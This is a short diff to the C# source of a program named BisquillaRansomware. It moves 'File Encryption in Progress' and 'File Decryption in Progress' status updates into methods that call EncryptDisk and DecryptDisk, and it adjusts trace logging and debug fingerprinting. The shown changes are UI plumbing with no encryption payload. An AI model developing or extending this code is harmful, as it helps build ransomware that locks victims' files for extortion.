@@ -7,7 +7,6 @@
 
 using System;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace BisquillaRansomware
@@ -61,15 +60,10 @@ namespace BisquillaRansomware
 
             // Show UI
             formMain = new Forms.FormMain();
+            formMain.UpdateStatus("Initializing");
 
-            if ("E".Equals(pwzArgument))
-            {
-                formMain.UpdateStatus("File Encryption in Progress");
-            }
-            else
-            {
-                formMain.UpdateStatus("File Decryption in Progress");
-            }
+            // Add UI Based Trace (Uncomment for Diagnostics Only)
+            //Trace.Listeners.Add(new UITraceListener(formMain));
 
             formMain.ShowDialog();
 
@@ -84,7 +78,6 @@ namespace BisquillaRansomware
         /// <returns></returns>
         static void Do(object operation)
         {
-            Trace.Listeners.Add(new ConsoleTraceListener());
 
 #if DEBUG
             // Debug FingerPrint Generation
@@ -138,12 +131,14 @@ namespace BisquillaRansomware
 
         private static void Enc()
         {
+            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Encryption in Progress");
             EncryptionStrategy es = new EncryptionStrategy();
             es.EncryptDisk();
         }
 
         private static void Dec()
         {
+            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Decryption in Progress");
             DecryptionStrategy ds = new DecryptionStrategy();
             ds.DecryptDisk();
         }
